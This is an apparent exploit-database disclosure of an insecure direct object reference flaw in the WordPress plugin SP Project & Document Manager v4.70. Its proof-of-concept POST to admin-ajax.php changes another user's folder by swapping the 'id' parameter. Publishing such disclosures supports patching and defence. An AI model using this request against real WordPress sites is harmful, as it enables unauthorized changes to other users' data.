# Exploit Title: SP Project & Document Manager v4.70 - Insecure Direct Object Reference(IDOR)
## Date: 2/20/2024
## Vendor Homepage: https://cn.wordpress.org/plugins/sp-client-document-manager/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SP Project & Document Manager
## Version: v4.70
## Exploit Description:
## SP Project & Document Manager v4.70 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to update folder that is assigned to other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...

action=cdm_save_category&name=folder22&id=2(CHANGE HERE)
```